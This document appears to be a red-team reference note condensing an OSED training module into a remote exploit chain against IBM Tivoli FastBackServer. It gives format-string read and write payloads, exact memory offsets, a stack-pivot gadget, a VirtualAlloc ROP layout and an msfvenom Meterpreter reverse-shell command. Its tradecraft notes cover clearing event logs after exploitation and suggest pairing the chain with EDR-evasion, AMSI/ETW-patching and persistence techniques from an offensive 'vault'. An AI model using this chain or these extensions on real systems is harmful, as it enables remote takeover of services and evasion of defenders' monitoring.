---
id: RTO-osed-format-string-exploit-dev
name: OSED Format String Exploitation & ASLR/DEP Bypass
source: OffSec / EXP-301 (OSED)
category: exploit-development
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T-005, T-016, T-020, T-021, T-022]
tags: [format-string, aslr-bypass, dep-bypass, rop, ret2libc, stack-pivot, write-primitive, read-primitive, shellcode, windbg, ida-pro, ibm-tivoli, fastbackserver, osed]
---

# OSED Format String Exploitation & ASLR/DEP Bypass — Training Reference

## TL;DR
This module covers the complete chain of advanced user-mode exploit development against IBM Tivoli Storage Manager FastBackServer: building a remote read primitive via format string specifiers (`%x`/`%s`) that leak a stack address and kernelbase.dll base, then transforming that into a remote write primitive via `%n` to overwrite a stored return address on the stack, pivot into a `psCommandBuffer`-stored ROP chain, call `VirtualAlloc` to bypass DEP, and execute a Meterpreter reverse shell. The training exemplifies the persistence and creative thinking required for browser-class exploit chains applied to a network service.

## Key Concepts

1. **Format String Specifier Semantics**
   - `%x` reads a DWORD from the va_list as hex (read primitive on stack args).
   - `%s` dereferences a pointer argument and copies a string into the formatted output (arbitrary read primitive on attacker-controlled addresses).
   - `%n` writes the count of bytes processed so far into the address supplied as the corresponding argument (write primitive). Disabled by default in modern MSVC, but enabled in vulnerable Tivoli build.
   - Width sub-specifier (`%256x`) pads output, raising the byte count and thus the value written by `%n`. Bounded by `vsnprintf` max size (here `0x1F4 - 0x2D = 0x1C7`).

2. **Tivoli FastBackServer Event Log Layout**
   - Log files: `C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER{001..040}.sf` (each ~2.56MB, suffix 040 is newest).
   - `SFILE_ReadBlock(Start, Length)` opens a specific file based on `Start` and reads `Length << 8` bytes via `fread` after `fseek`.
   - Max effective `Length = 0x1000` (yields `0x100000` byte reads); larger values return error (`0x1`).
   - Returned TCP packet prepends 4-byte little-endian size, enabling reliable streaming.

3. **Remote Read Primitive Construction**
   - Format string specifiers write the formatted output into the event log via `EventLog` → `EventLog_wrapted` → `ml_vsnprintf`.
   - Header `"w00t:"` + colon-separated values (`%x:`) provides a parseable, attacker-tagged record.
   - `Length` value 0x1000 + dynamic `Start` enumeration locates the tail of log file 040.

4. **Remote Stack Leak**
   - Leaked stack addr appears as 2nd value after the `w00t:` header.
   - **Critical OPSEC**: must use the same TCP socket for both the leak and subsequent reads — closing the socket terminates the per-connection thread and invalidates the leaked stack address.

5. **ASLR Bypass via Kernelbase Leak**
   - Stack reliably contains `KERNELBASE!WaitForSingleObjectEx+0x13a` at offset `0x15C` below the leaked address.
   - Re-running the format string with a `%s` specifier at the 21st position dereferences the target stack slot, leaking a kernelbase.dll pointer.
   - Subtract `0x10c36a` from the leaked pointer to recover `kernelbase.dll` base address.

6. **Write Primitive via `%n`**
   - `%n` writes a DWORD (count of bytes written so far) to an attacker-supplied address.
   - Constrained to range `0xC7`–`0x1C7` per invocation due to static prefix and `vsnprintf` size cap.
   - 4 sequential byte-writes (with carry into adjacent bytes) construct an arbitrary DWORD.
   - Width algorithm: `width = byteValue > 0xC6 ? (byteValue - 0xC7 + 8) : (byteValue + 0x39 + 8)`.
   - Stability hazard: 6th `%x` value can vary (use `%6x` width to normalize).

7. **Stack Pivot to psCommandBuffer**
   - Return address overwritten at offset `0x62078` from leaked stack pointer (target: `FastBackServer!_beginthreadex+0xf4`).
   - Pivot gadget at `kernelbase+0xe1af4`: `pop esp ; add esi, [ebp+3] ; mov al, 1 ; ret` (chosen for low side-effects).
   - Writes pivot gadget addr at `returnAddr` and the `psCommandBuffer` absolute address at `returnAddr+8`.
   - On socket close, the saved return is taken → pop esp loads `psCommandBuffer` → ret into ROP.

8. **DEP Bypass via VirtualAlloc Ret2Libc**
   - Pre-leaked kernelbase base + stack addr eliminate the "dummy values" approach — direct `VirtualAlloc` call.
   - `VirtualAlloc` at `kernelbase+0x1125d0`. NULL bytes are fine because `memcpy` (not `strcpy`) populates `psCommandBuffer`.
   - Stack layout post-pivot: `VirtualAlloc`, `ret=bufAddr+0x18`, `lpAddress=bufAddr+0x18`, `dwSize=0x200`, `flAllocationType=0x1000`, `flProtect=0x40` (PAGE_EXECUTE_READWRITE).

9. **Payload Delivery & OPSEC**
   - `msfvenom -p windows/meterpreter/reverse_http LHOST=... LPORT=443 EXITFUNC=thread` — preserve the FastBackServer process on Meterpreter exit.
   - 0x300-byte shellcode slot in `psCommandBuffer` (after ROP frame).
   - Only 2 stack DWORDs overwritten end-to-end (return addr + pivot target) — minimal stack corruption, evades stack cookies and CFG.

10. **CFG Bypass Strategy**
    - Overwriting a return address rather than an indirect call's target bypasses Control Flow Guard validation points (CFG validates indirect calls, not returns into module code). Mentioned in training as a general mitigation bypass technique.

## Operational Techniques

### Format String Read Primitive (%x + %s)
- **What**: Trigger `EventLog` to format-log stack contents, then read them back via the remote event log read API.
- **When to use**: When a target uses `vsnprintf`-style logging with attacker-controlled format strings and persists the output to a remotely-readable log.
- **How**:
  1. Reverse engineer opcode dispatch in `FXCLI_OraBR_Exec_Command` (opcode `0x604` reaches the vulnerable path).
  2. Construct `psAgentCommand` header (28 bytes) + `psCommandBuffer` containing `b"w00t:BB" + target_addr_packed + b"%x:" * 20 + b"%s" + b"%x" * 0x6b + padding`.
  3. Send via TCP 11460. `w00t:BB` aligns the controlled DWORD to a 4-byte boundary so `%s` consumes it as a pointer.
  4. Locate optimal `Start` via binary-search enumeration (returned size < `0x100000` indicates tail).
  5. Re-read event log; split on `b"w00t:"` then `b":"` to recover the leaked value.
- **Vault link**: No direct vault equivalent. The vault's T-016 stack spoofing and T-020 anti-analysis modules deal with controlling stack contents but not extracting them remotely.
- **Tool/code**: `python3 poc.py <ip>`; WinDbg breakpoint `bp FastBackServer!EventLog_wrapted+0x2dd` (filter by thread via `~.`).
- **OPSEC**: Generates substantial event log noise. Training suggests clearing the event log post-exploitation (extra-mile exercise points to a second cross-reference of `EventLOG_sSFILE` leading to an "Event Log Erased" code branch).

### Remote Event Log Reader
- **What**: Invoke opcode `0x520` to call `SFILE_ReadBlock` and stream event log entries back to the attacker over TCP.
- **When to use**: When extracting the format string leak payload from disk.
- **How**:
  1. `psCommandBuffer` = `b"FileType: %d ,Start: %d, Length: %d" % (1, startValue, 0x1000)`.
  2. Recv 4-byte size header; loop `s.recv(size - aSize)` until aggregated.
  3. `Length > 0x1000` corrupts the read state — restart FastBackServer if you hit it.
- **Vault link**: T-022 networking primitives (HTTP poll, NT sockets) cover similar recv-loop patterns but not the FastBack-specific enumeration.
- **Tool/code**: Python `socket` + `struct.pack`.
- **OPSEC**: `Length=0x1000` is the safe max — larger values force a service restart and create a service-availability signal.

### Width-Controlled %n Write Primitive
- **What**: Use `%n` with a width-padded `%x` to write a controlled byte value to an attacker-supplied address.
- **When to use**: After ASLR is bypassed and a writable target stack slot is identified.
- **How**:
  1. Compute `width` per the width algorithm (above).
  2. Format string: `b"w00t:BB" + pack("<I", targetAddr) + b"%x" * 5 + b":" + b"%6x:" + b"%x:" * 13 + b"%" + str(width).encode() + b"x:" + b"%n" + b"%x" * 0x6b`.
  3. Four iterations, incrementing `targetAddr` by `index` and right-shifting the value by `8*index & 0xFF`.
  4. The 6th `%x` is forced to width `6` to stabilize variance caused by residual stack data.
- **Vault link**: Vault's T-005 Ekko ROP Sleep builds ROP frames in memory directly via `RtlMoveMemory`-equivalent patterns; this training instead builds the frame via format string `%n` writes. Both achieve controlled DWORD placement via different mechanisms.
- **Tool/code**: Custom `writeDWORD(s, addr, value)` Python function.
- **OPSEC**: Each write generates an event log entry — total 4 entries per DWORD. Stack address noise from prior `vsnprintf` calls can shift the value; the `%6x` stabilizer mitigates this.

### Stack Pivot via Overwritten Return Address
- **What**: Overwrite `FastBackServer!_beginthreadex+0xf4`'s saved return with a `pop esp; ...; ret` gadget; write `psCommandBuffer`'s absolute address as the next DWORD so ESP loads it.
- **When to use**: When EIP is taken on thread teardown (socket close) and ESP doesn't naturally point to a controlled buffer.
- **How**:
  1. `returnAddr = stackAddr + 0x62078` (offset is constant across runs).
  2. `pivotAddr = kernelbaseBase + 0xe1af4`.
  3. `bufAddr = stackAddr + 0x55c5c` (offset to 2nd `psCommandBuffer` instance — handles NULL bytes correctly via `memcpy`).
  4. `writeDWORD(s, returnAddr, pivotAddr)` then `writeDWORD(s, returnAddr + 8, bufAddr)`.
  5. Send a final packet with `opcode=0x80` containing the ROP frame + shellcode in `psCommandBuffer`.
  6. `s.close()` triggers return → pop esp → ret into ROP.
- **Vault link**: T-005 Ekko ROP Sleep uses 6-frame ROP for sleep obfuscation but does not pivot ESP. T-016's CFG bypass section discusses overwriting return addresses for control flow subversion, but the vault's CFG bypass targets indirect call gadgets, not ret overwrite.
- **Tool/code**: `RP++` for gadget discovery: `rp++ -f kernelbase.dll -r 5`.
- **OPSEC**: Stack pivot side effects: `add esi, [ebp+3]` and `mov al, 1` are benign because EBP holds a stack pointer and AL is unused downstream. Verify your chosen gadget's side effects if FastBackServer's build differs.

### VirtualAlloc Ret2Libc (DEP Bypass)
- **What**: Direct `VirtualAlloc` invocation through ROP to mark `psCommandBuffer` shellcode region as `PAGE_EXECUTE_READWRITE`.
- **When to use**: When ASLR is bypassed, NULL bytes are tolerated by the buffer, and ESP can be pivoted to a controlled region.
- **How**:
  1. `VirtualAlloc = kernelbaseBase + 0x1125d0`.
  2. `psCommandBuffer` layout: `pack("<I", virtualAlloc) + pack("<I", bufAddr+0x18) + pack("<I", bufAddr+0x18) + pack("<I", 0x200) + pack("<I", 0x1000) + pack("<I", 0x40) + shellcode`.
  3. `0x1000` (MEM_COMMIT) + `0x40` (PAGE_EXECUTE_READWRITE).
- **Vault link**: T-016 EDR Evasion Suite includes `VirtualProtect` patching for AMSI/ETW bypass — same API family but different operational purpose (memory protection flipping for shellcode vs. for hook bypass).
- **Tool/code**: `msfvenom -p windows/meterpreter/reverse_http LHOST=<ip> LPORT=443 EXITFUNC=thread -f python -v shell`.
- **OPSEC**: `EXITFUNC=thread` is mandatory — closing the Meterpreter session otherwise tears down the FastBackServer process and drops persistence.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| WinDbg `bp ~. <addr>` | Conditional thread-context breakpoint | Avoids log spam from common paths (`EventLog`, `vsnprintf`) |
| WinDbg `dds esp L<n>` | Display stack as symbols + DWORDs | Use to verify format string arg arrays |
| WinDbg `!teb` + `s -d <limit> L?<n> <pattern>` | Locate buffers on stack | `StackBase - StackLimit` / 4 yields DWORD count for search |
| WinDbg `!vprot <addr>` | Verify page protection post-VirtualAlloc | Confirm `PAGE_EXECUTE_READWRITE` before shellcode execution |
| IDA Pro `FXCLI_OraBR_Exec_Command` graph | Static dispatch analysis | Find opcodes, call sites, format string refs |
| RP++ `rp++ -f kernelbase.dll -r 5` | ROP gadget discovery | Filter for side-effect-free `pop esp; ret` patterns |
| Pykd | WinDbg script automation | Use for gadget discovery + symbol resolution |
| Mona (Corelan) | Alternative gadget finder | Legacy, but `!mona rop` still functional |
| Keystone Engine | Inline assembly | Used in egghunter module (related OSED chapter) |
| `msfvenom -p windows/meterpreter/reverse_http EXITFUNC=thread` | Staged payload generation | `EXITFUNC=thread` mandatory to preserve process |
| `Select-String -Pattern '...' -SimpleMatch` | PowerShell log search | Verify format string leak locally |
| `Get-Content ... -Tail 1` | Read newest event log entry | Inspect format string output before parsing |
| `bp FastBackServer!_output+0x507` | Break on `%n` write | Confirms write value (ECX) and target (EAX) |
| Impacket `transport.DCERPCTransportFactory` | Python MS-RPC client | Used in Challenge 3 (Adventech WebAccess) |
| `~. bp` | Same-thread-only breakpoint | Required for hot paths like `EventLog_wrapted` |

## Gaps & Extensions

**What this training covers that the vault does not:**
- Format string vulnerability exploitation (`%x`, `%s`, `%n` primitives) — vault focuses on post-exploitation tradecraft, not exploitation primitives.
- Remote ASLR bypass via stack leak + event log read primitive — vault's ASLR-related content (T-016 evasion) is about *evading* ASLR-based detection, not bypassing ASLR for exploitation.
- Stack pivot technique (`pop esp; ret`) — vault's T-005 Ekko uses ROP for sleep but does not pivot ESP.
- Custom Win32 shellcode development (PEB walk, hash resolution, ws2_32 loading, WSASocket/CreateProcess reverse shell) — vault's T-004 PEB Walker is for syscall resolution, not API resolution for shellcode.
- Egghunter construction (Windows + SEH-extended + portability variants) — not in vault.
- DEP bypass via `VirtualAlloc` ret2libc — vault's T-016 uses `VirtualProtect` for AMSI/ETW patches but not for shellcode region protection.
- Reverse engineering methodology (IDA Pro graph analysis, WinDbg dynamic-static sync, `recv` API hooking).

**What the vault covers that this training does not:**
- Syscall-level evasion (T-001 RecycledGate, T-002 Hell's/Halo's/Tartarus Gate, T-003 VEH Gate) — training uses standard Win32 APIs.
- Process injection methods (T-007 through T-015) — training's Meterpreter payload runs in-process.
- Sleep obfuscation (T-005 Ekko) — training does not address in-memory idle behavior.
- EDR evasion primitives (AMSI/ETW patching, stack/arg spoofing, unhooking, PEB unlink, ACG, handle blocking) — training assumes no EDR.
- Persistence (T-017–T-019) — training's payload is one-shot.
- Anti-VM, API hammering, IAT camouflage, self-deletion (T-020) — training does not address analysis resistance.
- Cryptographic shellcode encoding (IPv4/IPv6/MAC/UUID/words from T-021) — training uses msfvenom staged payload.
- BYOVD, NT sockets, malleable C2 (T-022) — training's Meterpreter uses default profile.

**Specific extension opportunities:**
- The training's `psCommandBuffer` shellcode (RAW, 678 bytes Meterpreter reverse HTTP) could be replaced with vault's H.264 screen-streaming client (T-023) for post-exploitation functionality beyond a basic shell.
- The format string write primitive could be adapted to write a vault-style T-016 AMSI/ETW patch in-memory without dropping a DLL, enabling .NET/PowerShell post-exploitation on the target.
- The stack pivot gadget concept (control ESP via written DWORDs) parallels vault T-005's ROP frame construction — the vault's ROP materialization patterns (T-022 framework runtime) could automate gadget selection for FastBackServer-class exploits.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| Format string `%n` write primitive | T-005 Ekko ROP Sleep | Both use controlled DWORD placement via different mechanisms (training: format string writes; vault: ROP frame construction) |
| Stack pivot via `pop esp; ret` | T-005 Ekko ROP Sleep | Vault uses ROP for sleep obfuscation but does not pivot ESP — training extends the ROP concept with explicit pivot |
| `VirtualAlloc` ret2libc for DEP bypass | T-016 EDR Evasion Suite | Same API family (`VirtualProtect` for AMSI/ETW in vault); training uses `VirtualAlloc` for shellcode region protection |
| Overwriting return address to bypass CFG | T-016 EDR Evasion Suite | Vault's CFG bypass discussion targets indirect call validation; training's ret-overwrite approach evades CFG return-site checks |
| Custom Win32 shellcode (PEB walk, hash-based API resolution) | T-004 PEB Walker | Same PEB traversal mechanism; training uses for `kernel32.dll`/`ws2_32.dll` resolution; vault uses for `ntdll.dll` syscall stub resolution |
| `msfvenom` staged Meterpreter payload | T-023 Client Capabilities / T-021 Crypto & Obfuscation | Vault's custom shellcode encoder (IPv4/IPv6/MAC/UUID formats) is a stealthier alternative to msfvenom's shikata_ga_nai encoding |
| Egghunter (Windows + SEH variants) | (none) | Not covered by vault |
| Width-controlled `%n` byte-write algorithm | (none) | Not covered by vault |
| Remote event log read primitive | (none) | Not covered by vault |
| Pykad/RP++ gadget discovery | T-022 Framework (selector, planner, materializer) | Vault has automated technique materialization; equivalent gadget-automation layer could augment training's manual RP++ workflow |
| `EXITFUNC=thread` for Meterpreter exit | T-018 Edo Tensei (polymorphic resurrection) | Vault's persistence framework addresses post-exploitation survival; training's `EXITFUNC=thread` addresses same concern at the shellcode level |
| Impacket MS-RPC client (Challenge 3) | T-022 Network Suite | Vault's NT sockets / malleable C2 could provide post-exploitation RPC-style channels |
| IBM Tivoli FastBackServer target | (none) | Specific target, not applicable to vault's general Windows red team tradecraft |